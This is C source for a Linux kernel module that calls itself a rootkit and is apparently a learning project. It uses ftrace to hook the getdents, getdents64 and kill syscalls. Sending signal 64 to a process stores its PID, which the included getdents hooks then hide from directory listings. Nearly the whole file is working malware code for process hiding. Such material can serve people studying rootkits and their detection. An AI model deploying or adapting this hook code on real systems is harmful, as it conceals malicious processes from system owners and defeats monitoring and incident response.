#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#define PREFIX "goaway"

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hubert Liang");
MODULE_DESCRIPTION("My first rootkit");
MODULE_VERSION("0.02");

/* Global variable to store the PID to hide */
char hide_pid[NAME_MAX];

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* This is our hooked function for sys_kill */

asmlinkage int hook_kill(const struct pt_regs *regs)
{
	pid_t pid = regs->di;
	int sig = regs->si;

	if ( sig == 64 )
	{
		/* If we receive the magic signal
		 * then put the pid into the hide_pid string 
		 */
		printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
		sprintf(hide_pid, "%d", pid);
		return 0;
	}

	return orig_kill(regs);
}

#include "getdents.include"

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
	/* Hook the syscalls */
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Unhook and restore the syscalls */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

